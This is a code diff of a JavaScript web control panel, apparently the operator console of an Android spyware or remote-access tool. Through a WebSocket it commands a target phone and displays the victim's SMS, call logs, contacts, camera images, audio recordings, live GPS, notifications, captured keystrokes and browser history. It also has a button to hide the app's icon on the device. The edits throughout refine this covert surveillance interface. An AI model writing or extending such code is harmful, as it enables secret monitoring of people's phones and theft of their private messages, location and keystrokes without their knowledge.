                 dataType = 'file';
                 renderFiles();
                 pendingCommand = null;
             } catch (err) { console.error(err); }
+            
         } else if (msg.startsWith("SMS_DATA:")) {
             try {
-                currentData = JSON.parse(msg.substring(9));
+                const data = JSON.parse(msg.substring(9));
+                currentData = data;
                 dataType = 'sms';
                 renderTable();
                 pendingCommand = null;
             } catch (err) { console.error(err); }
+            
         } else if (msg.startsWith("CALL_DATA:")) {
             try {
-                currentData = JSON.parse(msg.substring(10));
+                const data = JSON.parse(msg.substring(10));
+                currentData = data;
                 dataType = 'call';
                 renderTable();
-                pendingCommand = null;
+                pendingCommand =null;
             } catch (err) { console.error(err); }
+            
         } else if (msg.startsWith("CAMERA_IMAGE:")) {
             const base64 = msg.substring(13);
             displayCapturedImage(base64);
             pendingCommand = null;
+            
         } else if (msg.startsWith("AUDIO_RECORDING:")) {
             showAudio(msg.substring(16));
             pendingCommand = null;
-        } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
-            screenActive = true;
-            document.getElementById('screenBtn').innerText = 'Stop Screen';
-            showNotification('Screen share started');
-            pendingCommand = null;
-        } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
-            screenActive = false;
-            document.getElementById('screenBtn').innerText = 'Start Screen';
-            if (screenPC) { screenPC.close(); screenPC = null; }
-            showNotification('Screen share stopped');
-            pendingCommand = null;
+            
         } else if (msg.startsWith("APP_HIDDEN")) {
             iconHidden = true;
             document.getElementById('iconBtn').innerText = 'Show Icon';
             showNotification('App icon hidden');
             pendingCommand = null;
+            
         } else if (msg.startsWith("APP_SHOWN")) {
             iconHidden = false;
             document.getElementById('iconBtn').innerText = 'Hide Icon';
             showNotification('App icon shown');
             pendingCommand = null;
+            
         } else if (msg.startsWith("FLASH_ON")) {
             showNotification('🔦 Flashlight ON');
             pendingCommand = null;
+            
         } else if (msg.startsWith("FLASH_OFF")) {
             showNotification('🔦 Flashlight OFF');
             pendingCommand = null;
+            
         } else if (msg.startsWith("FLASH_TIMED")) {
             showNotification('⏱️ Flash timed complete');
             pendingCommand = null;
+            
         } else if (msg.startsWith("FLASH_BLINK")) {
             showNotification('✨ Flash blink complete');
             pendingCommand = null;
+            
         } else if (msg.startsWith("VIBRATE_DONE")) {
             showNotification('Vibration done');
             pendingCommand = null;
+            
         } else if (msg.startsWith("ERROR:")) {
-            panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
+            panel.innerHTML = `<div style="color:#d32f2f;">❌ Error: ${msg.substring(6)}</div>`;
             pendingCommand = null;
+            
         } else if (msg.startsWith("FILE_DATA:")) {
             const base64 = msg.substring(10);
             downloadBase64(base64, 'downloaded_file');
             pendingCommand = null;
+            
         } else if (msg.startsWith("I_AM_DEVICE")) {
             console.log('Device identified');
+            
         } else if (msg.startsWith('[') || msg.startsWith('{')) {
             try {
                 const parsed = JSON.parse(msg);
@@ -1492,11 +1672,89 @@
             } catch (err) {
                 console.error('Failed to parse JSON in plain text:', err);
             }
+            
         } else {
             console.log('Unhandled plain text:', msg);
         }
     }
 
+    // ---------- MESSAGE HANDLER ----------
+    function handleIncomingMessage(msg) {
+        try {
+            const json = JSON.parse(msg);
+            if (json.type === 'SIGNALING') {
+                handleSignalingMessage(json.data);
+            } else {
+                handleJSON(json);
+            }
+        } catch (e) {
+            handlePlainText(msg);
+        }
+    }
+
+    // ---------- WEBSOCKET CONNECTION ----------
+    function connectWebSocket() {
+        if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
+            console.log('already connecting/open');
+            return;
+        }
+        if (reconnectTimer) {
+            clearTimeout(reconnectTimer);
+            reconnectTimer = null;
+        }
+        setStatus('CONNECTING');
+        if (wsDebug) wsDebug.innerText = '🌐 WebSocket: connecting...';
+        panel.innerHTML = '⏳ Connecting to server...';
+
+        ws = new WebSocket(WS_URL);
+        ws.onopen = () => {
+            console.log('WebSocket connected');
+            reconnectAttempts = 0;
+            ws.send('I_AM_WEB');
+            setStatus('ONLINE');
+            panel.innerHTML = '✅ Connected to server. Ready.';
+            if (wsDebug) wsDebug.innerText = '🌐 WebSocket: ONLINE';
+        };
+        ws.onmessage = (e) => {
+            console.log('RAW message:', e.data.substring(0, 100));
+            handleIncomingMessage(e.data);
+        };
+        ws.onclose = (ev) => {
+            console.log('WebSocket closed', ev.reason);
+            setStatus('OFFLINE');
+            if (wsDebug) wsDebug.innerText = `🌐 WebSocket: closed (${ev.reason})`;
+            panel.innerHTML = '🔌 WebSocket disconnected. <a href="#" onclick="manualReconnect()">Reconnect</a>.';
+            ws = null;
+
+            const delay = Math.min(1000 * Math.pow(1.5, reconnectAttempts), MAX_RECONNECT_DELAY);
+            reconnectAttempts++;
+            if (reconnectTimer) clearTimeout(reconnectTimer);
+            reconnectTimer = setTimeout(() => {
+                console.log('Reconnecting...');
+                connectWebSocket();
+            }, delay);
+        };
+        ws.onerror = (err) => {
+            console.error('WebSocket error:', err);
+            setStatus('ERROR');
+            if (wsDebug) wsDebug.innerText = '🌐 WebSocket: error';
+        };
+    }
+
+    function manualReconnect() {
+        if (reconnectTimer) {
+            clearTimeout(reconnectTimer);
+            reconnectTimer = null;
+        }
+        if (ws) {
+            ws.close();
+            ws = null;
+        }
+        reconnectAttempts = 0;
+        connectWebSocket();
+    }
+
+    // ---------- UI HELPERS ----------
     function setStatus(s) {
         statusEl.innerText = s;
         if (s === 'ONLINE') {
@@ -1508,6 +1766,34 @@
             statusEl.style.background = '#ffebee';
             statusEl.style.color = '#c62828';
         }
+    }
+
+    function showNotification(text) {
+        const orig = statusEl.innerText;
+        statusEl.innerText = text;
+        setTimeout(() => { statusEl.innerText = orig; }, 2000);
+    }
+
+    function pushAlert(title, body) {
+        newAlerts.unshift({ title: title, body: body, time: new Date().toLocaleTimeString() });
+        if (newAlerts.length > 50) newAlerts.pop();
+        const badge = document.getElementById('alertsBadge');
+        const list  = document.getElementById('alertsList');
+        if (!badge || !list) return;
+        badge.style.display = 'block';
+        list.innerHTML = '';
+        newAlerts.forEach(function(a) {
+            const d = document.createElement('div');
+            d.style.cssText = 'margin-bottom:4px;padding:4px;background:#fff;border-radius:4px;font-size:11px';
+            d.textContent = a.time + ' ' + a.title + ': ' + a.body;
+            list.appendChild(d);
+        });
+    }
+
+    function clearAlerts() {
+        newAlerts.length = 0;
+        const badge = document.getElementById('alertsBadge');
+        if (badge) badge.style.display = 'none';
     }
 
     // ---------- CAMERA UI ----------
@@ -1531,9 +1817,9 @@
 
     function displayCapturedImage(base64) {
         panel.innerHTML = `
-            <img src="data:image/jpeg;base64,${base64}">
+            <img src="data:image/jpeg;base64,${base64}" style="max-width:100%; border-radius:8px;">
             <div style="margin-top:10px;">
-                <button onclick="downloadBase64('${base64}', 'snapshot_${Date.now()}.jpeg')">SAVE IMAGE</button>
+                <button onclick="downloadBase64('${base64}', 'snapshot_${Date.now()}.jpeg')" style="padding:8px 16px; background:#1976ff; color:#fff; border:none; border-radius:6px; cursor:pointer;">💾 SAVE IMAGE</button>
             </div>
         `;
     }
@@ -1559,62 +1845,63 @@
         }, 'image/png');
     }
 
-   function toggleRecording() {
-    const video = document.getElementById('liveCamVideo');
-    if (!video || !video.srcObject) {
-        alert('No live stream');
-        return;
-    }
-    if (mediaRecorder && mediaRecorder.state === 'recording') {
-        mediaRecorder.stop();
-        document.getElementById('recordBtn').innerText = 'Record Video';
-    } else {
-        recordedChunks = [];
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
-        const stream = video.srcObject;
-
-        if (video.videoWidth === 0) {
-            video.onloadedmetadata = () => startCanvasRecording(video, canvas, ctx, stream);
+    function toggleRecording() {
+        const video = document.getElementById('liveCamVideo');
+        if (!video || !video.srcObject) {
+            alert('No live stream');
+            return;
+        }
+        if (mediaRecorder && mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
+            document.getElementById('recordBtn').innerText = 'Record Video';
         } else {
-            startCanvasRecording(video, canvas, ctx, stream);
+            recordedChunks = [];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            const stream = video.srcObject;
+
+            if (video.videoWidth === 0) {
+                video.onloadedmetadata = () => startCanvasRecording(video, canvas, ctx, stream);
+            } else {
+                startCanvasRecording(video, canvas, ctx, stream);
+            }
         }
     }
-}
 
-function startCanvasRecording(video, canvas, ctx, originalStream) {
-    canvas.width = video.videoHeight;
-    canvas.height = video.videoWidth;
+    function startCanvasRecording(video, canvas, ctx, originalStream) {
+        canvas.width = video.videoHeight;
+        canvas.height = video.videoWidth;
 
-    function drawVideoFrame() {
-        ctx.save();
-        ctx.translate(canvas.width / 2, canvas.height / 2);
-        ctx.rotate(90 * Math.PI / 180);
-        ctx.drawImage(video, -video.videoWidth / 2, -video.videoHeight / 2,
-                     video.videoWidth, video.videoHeight);
-        ctx.restore();
-        requestAnimationFrame(drawVideoFrame);
+        function drawVideoFrame() {
+            ctx.save();
+            ctx.translate(canvas.width / 2, canvas.height / 2);
+            ctx.rotate(90 * Math.PI / 180);
+            ctx.drawImage(video, -video.videoWidth / 2, -video.videoHeight / 2,
+                         video.videoWidth, video.videoHeight);
+            ctx.restore();
+            requestAnimationFrame(drawVideoFrame);
+        }
+        drawVideoFrame();
+
+        const canvasStream = canvas.captureStream(30);
+        originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
+
+        mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
+        mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
+        mediaRecorder.onstop = () => {
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `recording_${Date.now()}.webm`;
+            a.click();
+            URL.revokeObjectURL(url);
+            canvasStream.getTracks().forEach(track => track.stop());
+        };
+        mediaRecorder.start();
+        document.getElementById('recordBtn').innerText = 'Stop Recording';
     }
-    drawVideoFrame();
 
-    const canvasStream = canvas.captureStream(30);
-    originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));
-
-    mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
-    mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
-    mediaRecorder.onstop = () => {
-        const blob = new Blob(recordedChunks, { type: 'video/webm' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = `recording_${Date.now()}.webm`;
-        a.click();
-        URL.revokeObjectURL(url);
-        canvasStream.getTracks().forEach(track => track.stop());
-    };
-    mediaRecorder.start();
-    document.getElementById('recordBtn').innerText = 'Stop Recording';
-}
     // ---------- APP ICON TOGGLE ----------
     function toggleAppIcon() {
         if (iconHidden) sendPlainText('showApp');
@@ -1624,8 +1911,8 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
     // ---------- RENDERERS ----------
     function showAudio(base64) {
         panel.innerHTML = `
-            <audio controls src="data:audio/3gp;base64,${base64}"></audio>
-            <button onclick="downloadBase64('${base64}', 'recording.3gp')">Download</button>
+            <audio controls src="data:audio/3gp;base64,${base64}" style="width:100%;"></audio>
+            <button onclick="downloadBase64('${base64}', 'recording.3gp')" style="margin-top:10px; padding:8px 16px; background:#1976ff; color:#fff; border:none; border-radius:6px;">💾 Download</button>
         `;
     }
 
@@ -1637,14 +1924,14 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
     }
 
     function renderMap(loc) {
-        panel.innerHTML = '<div id="map" style="position:relative;"></div>';
+        panel.innerHTML = '<div id="map" style="position:relative; height:400px;"></div>';
         const mapDiv = document.getElementById('map');
 
         const infoDiv = document.createElement('div');
         infoDiv.className = 'map-info';
         infoDiv.innerHTML = `
-            <div class="coord">📍 ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}</div>
-            <div>🎯 Accuracy: ${loc.accuracy ? loc.accuracy.toFixed(1) : '?'} m</div>
+            <div class="coord">📍 ${parseFloat(loc.lat).toFixed(6)}, ${parseFloat(loc.lon).toFixed(6)}</div>
+            <div>🎯 Accuracy: ${loc.accuracy ? parseFloat(loc.accuracy).toFixed(1) : '?'} m</div>
             <div>📡 Provider: ${loc.provider || 'unknown'}</div>
             <div class="addr">🌍 Loading address...</div>
         `;
@@ -1656,7 +1943,7 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
         L.circle([loc.lat, loc.lon], { radius: loc.accuracy || 10, color: '#1976ff' }).addTo(mapInstance);
 
         const gfBtn = document.createElement('button');
-        gfBtn.textContent = '\u{1F5FA}\uFE0F Set Geofence Here';
+        gfBtn.textContent = '🗺️ Set Geofence Here';
         gfBtn.style.cssText = 'margin-top:8px;padding:5px 12px;background:#4caf50;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px';
         gfBtn.addEventListener('click', function() { useLocationAsGeofence(loc.lat, loc.lon); });
         panel.appendChild(gfBtn);
@@ -1677,22 +1964,27 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
 
     function renderTable() {
         if (!currentData || currentData.length === 0) {
-            panel.innerHTML = '<p>No data</p>';
+            panel.innerHTML = '<p style="color:#999; padding:20px;">No data available</p>';
             return;
         }
 
         let headers = [], rows = [];
         if (dataType === 'sms') {
             headers = ['Type', 'Number', 'Message', 'Date'];
-            rows = currentData.map(item => [item.type, item.address, item.body, item.date]);
+            rows = currentData.map(item => [
+                item.type || (item.type === 1 ? 'Incoming' : 'Outgoing'),
+                item.address || item.number || 'Unknown',
+                item.body || '',
+                item.date || item.timeFmt || ''
+            ]);
         } else if (dataType === 'call') {
             headers = ['Type', 'Number', 'Name', 'Date', 'Duration'];
             rows = currentData.map(item => [
-                item.type,
-                item.number,
+                item.type || '',
+                item.number || '',
                 item.name || '',
-                item.date,
-                item.duration + 's'
+                item.date || item.timeFmt || '',
+                item.duration ? item.duration + 's' : ''
             ]);
         } else {
             panel.innerHTML = '<p>Unknown data type</p>';
@@ -1710,7 +2002,7 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
 
         pageRows.forEach(r => {
             html += '<tr>';
-            r.forEach(cell => html += `<td>${cell}</td>`);
+            r.forEach(cell => html += `<td>${cell || ''}</td>`);
             html += '</tr>';
         });
         html += '</tbody></table>';
@@ -1846,169 +2138,7 @@ function startCanvasRecording(video, canvas, ctx, originalStream) {
         return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
     }
 
-    function showNotification(text) {
-        const orig = statusEl.innerText;
-        statusEl.innerText = text;
-        setTimeout(() => { statusEl.innerText = orig; }, 2000);
-    }
-
-    // ---------- WEBSOCKET MESSAGE HANDLER ----------
-    function handleIncomingMessage(msg) {
-        try {
-            const json = JSON.parse(msg);
-            if (json.type === 'SIGNALING') {
-                handleSignalingMessage(json.data);
-            } else {
-                handleJSON(json);
-            }
-        } catch (e) {
-            handlePlainText(msg);
-        }
-    }
-
-    // ---------- ROBUST WEBSOCKET CONNECTION with reconnection ----------
-    function connectWebSocket() {
-        if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
-            console.log('already connecting/open');
-            return;
-        }
-        if (reconnectTimer) {
-            clearTimeout(reconnectTimer);
-            reconnectTimer = null;
-        }
-        setStatus('CONNECTING');
-        if (wsDebug) wsDebug.innerText = '🌐 WebSocket: connecting...';
-        panel.innerHTML = '⏳ Connecting to server...';
-
-        ws = new WebSocket(WS_URL);
-        ws.onopen = () => {
-            console.log('WebSocket connected');
-            reconnectAttempts = 0; // reset
-            ws.send('I_AM_WEB');
-            setStatus('ONLINE');
-            panel.innerHTML = '✅ Connected to server. Ready.';
-            if (wsDebug) wsDebug.innerText = '🌐 WebSocket: ONLINE';
-        };
-        ws.onmessage = (e) => {
-            console.log('RAW message:', e.data.substring(0, 100));
-            handleIncomingMessage(e.data);
-        };
-        ws.onclose = (ev) => {
-            console.log('WebSocket closed', ev.reason);
-            setStatus('OFFLINE');
-            if (wsDebug) wsDebug.innerText = `🌐 WebSocket: closed (${ev.reason})`;
-            panel.innerHTML = '🔌 WebSocket disconnected. <a href="#" onclick="manualReconnect()">Reconnect</a>.';
-            ws = null;
-
-            // attempt reconnect with exponential backoff
-            const delay = Math.min(1000 * Math.pow(1.5, reconnectAttempts), MAX_RECONNECT_DELAY);
-            reconnectAttempts++;
-            if (reconnectTimer) clearTimeout(reconnectTimer);
-            reconnectTimer = setTimeout(() => {
-                console.log('Reconnecting...');
-                connectWebSocket();
-            }, delay);
-        };
-        ws.onerror = (err) => {
-            console.error('WebSocket error:', err);
-            setStatus('ERROR');
-            if (wsDebug) wsDebug.innerText = '🌐 WebSocket: error';
-            // error will also trigger onclose
-        };
-    }
-
-    // manual reconnect (by user)
-    function manualReconnect() {
-        if (reconnectTimer) {
-            clearTimeout(reconnectTimer);
-            reconnectTimer = null;
-        }
-        if (ws) {
-            ws.close();
-            ws = null;
-        }
-        reconnectAttempts = 0;
-        connectWebSocket();
-    }
-
-// Add this inside your <script> (after DOM is ready)
-document.querySelectorAll('input[name="clickCameraSelect"]').forEach(radio => {
-    radio.addEventListener('change', function() {
-        const flashCheckbox = document.getElementById('clickFlashCheckbox');
-        const flashLabel = flashCheckbox.closest('.camera-option');
-        if (this.value === 'front') {
-            flashLabel.style.display = 'none';
-        } else {
-            flashLabel.style.display = '';
-        }
-    });
-});
-window.addEventListener('load', () => {
-    const selected = document.querySelector('input[name="clickCameraSelect"]:checked');
-    if (selected && selected.value === 'front') {
-        document.getElementById('clickFlashCheckbox').closest('.camera-option').style.display = 'none';
-    }
-});
-    // ── New global state ──
-    let liveGpsActive = false;
-    const newAlerts = [];
-    let appsData = [];
-
-    // ── Utility ───────────────────────────────────────────────────────────────
-    function parseData(data) {
-        if (typeof data === 'string') {
-            try { return JSON.parse(data); } catch (e) { return data; }
-        }
-        return data;
-    }
-
-    // ── Alerts badge ──────────────────────────────────────────────────────────
-    function pushAlert(title, body) {
-        newAlerts.unshift({ title: title, body: body, time: new Date().toLocaleTimeString() });
-        if (newAlerts.length > 50) newAlerts.pop();
-        const badge = document.getElementById('alertsBadge');
-        const list  = document.getElementById('alertsList');
-        if (!badge || !list) return;
-        badge.style.display = 'block';
-        list.innerHTML = '';
-        newAlerts.forEach(function(a) {
-            const d = document.createElement('div');
-            d.style.cssText = 'margin-bottom:4px;padding:4px;background:#fff;border-radius:4px;font-size:11px';
-            d.textContent = a.time + ' ' + a.title + ': ' + a.body;
-            list.appendChild(d);
-        });
-    }
-
-    function clearAlerts() {
-        newAlerts.length = 0;
-        const badge = document.getElementById('alertsBadge');
-        if (badge) badge.style.display = 'none';
-    }
-
-    // ── Live GPS ──────────────────────────────────────────────────────────────
-    function toggleLiveGps() {
-        const btn = document.getElementById('liveGpsBtn');
-        if (!liveGpsActive) {
-            sendCommand('START_GPS_UPDATES');
-            liveGpsActive = true;
-            if (btn) {
-                btn.querySelector('span:last-child').textContent = 'Stop GPS Track';
-                btn.style.background = '#d32f2f';
-                btn.style.color = '#fff';
-            }
-            showNotification('Live GPS started');
-        } else {
-            sendCommand('STOP_GPS_UPDATES');
-            liveGpsActive = false;
-            if (btn) {
-                btn.querySelector('span:last-child').textContent = 'Live GPS Track';
-                btn.style.cssText = '';
-            }
-            showNotification('GPS stopped');
-        }
-    }
-
-    // ── Contacts ──────────────────────────────────────────────────────────────
+    // ---------- DATA DISPLAY FUNCTIONS ----------
     function displayContacts(data) {
         panel.innerHTML = '';
         if (!Array.isArray(data) || data.length === 0) {
@@ -2023,7 +2153,7 @@ window.addEventListener('load', () => {
         wrap.style.overflowX = 'auto';
         const tbl = document.createElement('table');
         tbl.style.cssText = 'width:100%;border-collapse:collapse;font-size:13px';
-        tbl.innerHTML = '<thead><tr style="background:#f5f7fa"><th style="padding:8px;text-align:left">Name</th><th style="padding:8px;text-align:left">Number</th><th style="padding:8px">Calls</th></tr></thead>';
+        tbl.innerHTML = '<thead><tr style="background:#f5f7fa"><th style="padding:8px;text-align:left">Name</th><th style="padding:8px;text-align:left">Number</th><th style="padding:8px">Times Contacted</th></tr></thead>';
         const tbody = document.createElement('tbody');
         data.forEach(function(c) {
             const tr = document.createElement('tr');
@@ -2039,7 +2169,6 @@ window.addEventListener('load', () => {
         panel.appendChild(wrap);
     }
 
-    // ── Installed Apps ────────────────────────────────────────────────────────
     function displayInstalledApps(data) {
         panel.innerHTML = '';
         if (!Array.isArray(data) || data.length === 0) {
@@ -2058,7 +2187,7 @@ window.addEventListener('load', () => {
         tbl.innerHTML = '<thead><tr style="background:#f5f7fa;position:sticky;top:0"><th style="padding:8px;text-align:left">App</th><th style="padding:8px;text-align:left">Package</th><th style="padding:8px">Actions</th></tr></thead>';
         const tbody = document.createElement('tbody');
 
-        data.forEach(function(app, idx) {
+        data.forEach(function(app) {
             const tr = document.createElement('tr');
             tr.style.borderBottom = '1px solid #f0f0f0';
 
@@ -2085,7 +2214,6 @@ window.addEventListener('load', () => {
         panel.appendChild(wrap);
     }
 
-    // ── Screen Time ───────────────────────────────────────────────────────────
     function showAppUsagePanel() {
         panel.innerHTML = '<h3>📊 Screen Time</h3><p style="color:#999;font-size:12px">⚠️ Requires Usage Access permission on device</p>';
         const btnRow = document.createElement('div');
@@ -2097,55 +2225,50 @@ window.addEventListener('load', () => {
             b.addEventListener('click', function() { sendCommand('GET_APP_USAGE', { days: item[1] }); });
             btnRow.appendChild(b);
         });
-        panel.insertBefore(btnRow, panel.children[1]);
+        panel.appendChild(btnRow);
     }
 
     function displayAppUsage(data) {
         panel.innerHTML = '';
         if (!Array.isArray(data) || data.length === 0) {
-            panel.innerHTML = '<h3>📊 Screen Time</h3><p style="color:#999">No data. Enable Usage Access in device Settings → Digital Wellbeing.</p>';
+            panel.innerHTML = '<h3>📊 Screen Time</h3><p style="color:#999">No data available. Enable Usage Access in device Settings.</p>';
             return;
         }
         const h3 = document.createElement('h3');
         h3.textContent = '📊 Screen Time (' + data.length + ' apps)';
         panel.appendChild(h3);
 
-        const wrap = document.createElement('div');
-        wrap.style.overflowX = 'auto';
-        const tbl = document.createElement('table');
-        tbl.style.cssText = 'width:100%;border-collapse:collapse;font-size:13px';
-        tbl.innerHTML = '<thead><tr style="background:#f5f7fa"><th style="padding:8px;text-align:left">App</th><th style="padding:8px">Usage</th><th style="padding:8px;min-width:100px;text-align:left">Bar</th></tr></thead>';
-        const tbody = document.createElement('tbody');
-        const maxMs = data[0].totalTimeMs || 1;
-        data.forEach(function(a) {
-            const pct = Math.max(2, Math.round(a.totalTimeMs / maxMs * 100));
-            const col = a.totalTimeMs > 3600000 ? '#d32f2f' : a.totalTimeMs > 1800000 ? '#ff9800' : '#4caf50';
-            const tr = document.createElement('tr');
-            tr.style.borderBottom = '1px solid #f0f0f0';
-            const td1 = document.createElement('td'); td1.style.padding = '7px 8px'; td1.textContent = a.appName || '';
-            const td2 = document.createElement('td'); td2.style.cssText = 'padding:7px 8px;text-align:center;font-weight:600'; td2.textContent = a.totalTimeFmt || '';
-            const td3 = document.createElement('td'); td3.style.padding = '7px 8px';
-            const bar = document.createElement('div');
-            bar.style.cssText = 'height:10px;border-radius:5px;width:' + pct + '%;background:' + col;
-            td3.appendChild(bar);
-            tr.appendChild(td1); tr.appendChild(td2); tr.appendChild(td3);
-            tbody.appendChild(tr);
+        data.forEach(function(app) {
+            const totalMs = app.totalTimeMs || 0;
+            const hours = Math.floor(totalMs / 3600000);
+            const minutes = Math.floor((totalMs % 3600000) / 60000);
+            const timeStr = hours > 0 ? `${hours}h ${minutes}m` : `${minutes}m`;
+            
+            const maxMs = Math.max(...data.map(a => a.totalTimeMs || 0));
+            const pct = maxMs > 0 ? Math.round((totalMs / maxMs) * 100) : 0;
+            
+            const itemDiv = document.createElement('div');
+            itemDiv.className = 'app-usage-item';
+            itemDiv.innerHTML = `
+                <div class="app-usage-name">${app.appName || app.packageName || 'Unknown'}</div>
+                <div class="app-usage-time">${timeStr}</div>
+                <div style="flex:0.5; margin-left:10px;">
+                    <div class="usage-bar" style="width:${pct}%; background-color:${totalMs > 3600000 ? '#d32f2f' : totalMs > 1800000 ? '#ff9800' : '#4caf50'};"></div>
+                </div>
+            `;
+            panel.appendChild(itemDiv);
         });
-        tbl.appendChild(tbody);
-        wrap.appendChild(tbl);
-        panel.appendChild(wrap);
     }
 
-    // ── Social Messages ───────────────────────────────────────────────────────
     function displayNotifications(data) {
         panel.innerHTML = '';
         if (!Array.isArray(data) || data.length === 0) {
-            panel.innerHTML = '<h3>🔔 Social Messages</h3><p style="color:#999;margin-top:16px">No messages yet.<br>Enable Notification Access: Settings → Apps → Special App Access → Notification Access</p>';
+            panel.innerHTML = '<h3>🔔 Notifications</h3><p style="color:#999;margin-top:16px">No notifications yet.</p>';
             return;
         }
         const hdr = document.createElement('div');
         hdr.style.cssText = 'display:flex;justify-content:space-between;align-items:center;margin-bottom:10px';
-        const h3 = document.createElement('h3'); h3.style.margin = '0'; h3.textContent = '🔔 Social Messages (' + data.length + ')';
+        const h3 = document.createElement('h3'); h3.style.margin = '0'; h3.textContent = '🔔 Notifications (' + data.length + ')';
         const clr = document.createElement('button');
         clr.textContent = 'Clear';
         clr.style.cssText = 'padding:5px 12px;background:#d32f2f;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:12px';
@@ -2158,21 +2281,20 @@ window.addEventListener('load', () => {
             card.style.cssText = 'background:#fff;border:1px solid #e8e8e8;border-radius:8px;padding:10px;margin-bottom:8px';
             const top = document.createElement('div');
             top.style.cssText = 'display:flex;justify-content:space-between;margin-bottom:4px';
-            const appSpan = document.createElement('span'); appSpan.style.cssText = 'font-weight:700;font-size:13px'; appSpan.textContent = n.app || '';
-            const timeSpan = document.createElement('span'); timeSpan.style.cssText = 'color:#aaa;font-size:11px'; timeSpan.textContent = n.timeFmt || '';
+            const appSpan = document.createElement('span'); appSpan.style.cssText = 'font-weight:700;font-size:13px'; appSpan.textContent = n.app || n.packageName || '';
+            const timeSpan = document.createElement('span'); timeSpan.style.cssText = 'color:#aaa;font-size:11px'; timeSpan.textContent = n.timeFmt || n.date || '';
             top.appendChild(appSpan); top.appendChild(timeSpan);
             const title = document.createElement('div'); title.style.cssText = 'font-size:13px;font-weight:600;color:#555'; title.textContent = n.title || '';
-            const text  = document.createElement('div'); text.style.cssText = 'font-size:13px;color:#333;margin-top:2px'; text.textContent = n.text || '';
+            const text  = document.createElement('div'); text.style.cssText = 'font-size:13px;color:#333;margin-top:2px'; text.textContent = n.text || n.body || '';
             card.appendChild(top); card.appendChild(title); card.appendChild(text);
             panel.appendChild(card);
         });
     }
 
-    // ── Keyboard Log ──────────────────────────────────────────────────────────
     function displayKeylog(data) {
         panel.innerHTML = '';
         if (!Array.isArray(data) || data.length === 0) {
-            panel.innerHTML = '<h3>⌨️ Keyboard Log</h3><p style="color:#999">No keystrokes yet. Enable Accessibility Service on device.</p>';
+            panel.innerHTML = '<h3>⌨️ Keyboard Log</h3><p style="color:#999">No keystrokes yet.</p>';
             return;
         }
         const hdr = document.createElement('div');
@@ -2192,22 +2314,17 @@ window.addEventListener('load', () => {
         const tbody = document.createElement('tbody');
         data.slice().reverse().forEach(function(e) {
             const tr = document.createElement('tr'); tr.style.borderBottom = '1px solid #f0f0f0';
-            const td1 = document.createElement('td'); td1.style.cssText = 'padding:5px 8px;color:#999;white-space:nowrap;font-size:11px'; td1.textContent = e.timeFmt || '';
-            const td2 = document.createElement('td'); td2.style.cssText = 'padding:5px 8px;font-size:11px'; td2.textContent = (e.pkg || '').split('.').pop();
-            const td3 = document.createElement('td'); td3.style.cssText = 'padding:5px 8px;font-family:monospace'; td3.textContent = e.text || '';
+            const td1 = document.createElement('td'); td1.style.cssText = 'padding:5px 8px;color:#999;white-space:nowrap;font-size:11px'; td1.textContent = e.timeFmt || e.date || '';
+            const td2 = document.createElement('td'); td2.style.cssText = 'padding:5px 8px;font-size:11px'; td2.textContent = (e.pkg || e.packageName || '').split('.').pop();
+            const td3 = document.createElement('td'); td3.style.cssText = 'padding:5px 8px;font-family:monospace'; td3.textContent = e.text || e.key || '';
             tr.appendChild(td1); tr.appendChild(td2); tr.appendChild(td3);
             tbody.appendChild(tr);
         });
         tbl.appendChild(tbody); wrap.appendChild(tbl); panel.appendChild(wrap);
     }
 
-    // ── Browser History ───────────────────────────────────────────────────────
     function displayBrowserHistory(data) {
         panel.innerHTML = '';
-        if (!data || data.error) {
-            panel.innerHTML = '<h3>🌐 Browser History</h3><p style="color:#999">' + (data && data.error ? data.error : 'Not available on this device.') + '</p>';
-            return;
-        }
         if (!Array.isArray(data) || data.length === 0) {
             panel.innerHTML = '<h3>🌐 Browser History</h3><p style="color:#999">No history found.</p>';
             return;
@@ -2222,7 +2339,7 @@ window.addEventListener('load', () => {
         const tbody = document.createElement('tbody');
         data.forEach(function(item) {
             const tr = document.createElement('tr'); tr.style.borderBottom = '1px solid #f0f0f0';
-            const td1 = document.createElement('td'); td1.style.cssText = 'padding:5px 8px;white-space:nowrap;color:#999;font-size:11px'; td1.textContent = item.date || '';
+            const td1 = document.createElement('td'); td1.style.cssText = 'padding:5px 8px;white-space:nowrap;color:#999;font-size:11px'; td1.textContent = item.date || item.timeFmt || '';
             const td2 = document.createElement('td'); td2.style.padding = '5px 8px'; td2.textContent = item.title || '';
             const td3 = document.createElement('td'); td3.style.cssText = 'padding:5px 8px;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap';
             const a = document.createElement('a'); a.href = item.url || '#'; a.target = '_blank'; a.style.cssText = 'color:#1976ff;text-decoration:none'; a.textContent = item.url || '';
@@ -2233,7 +2350,6 @@ window.addEventListener('load', () => {
         tbl.appendChild(tbody); wrap.appendChild(tbl); panel.appendChild(wrap);
     }
 
-    // ── Wi-Fi Networks ────────────────────────────────────────────────────────
